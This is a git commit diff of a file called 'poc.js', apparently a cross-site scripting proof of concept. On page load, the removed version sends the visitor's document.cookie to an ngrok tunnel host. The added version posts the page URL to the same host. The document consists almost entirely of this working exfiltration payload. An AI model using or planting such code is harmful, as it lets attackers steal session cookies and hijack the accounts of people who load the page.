463036bf93bb28864839a4359815dbbeb5795085
RE <turbine@UnknownHardware.localdomain>
2023-02-08 12:22:23 -0500

    Initial Commit

--- poc.js
+++ poc.js
@@ -1,9 +1,11 @@
 window.onload = function() {
-  fetch('https://0427-69-255-41-193.ngrok.io?cookie=' + encodeURIComponent(document.cookie), {
-    method: 'GET',
+  fetch('https://0427-69-255-41-193.ngrok.io', {
+    method: 'POST',
     headers: {
-      'Content-Type': 'application/json',
-      'Cookie': document.cookie
-    }
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      url: window.location.href
+    })
   });
 };
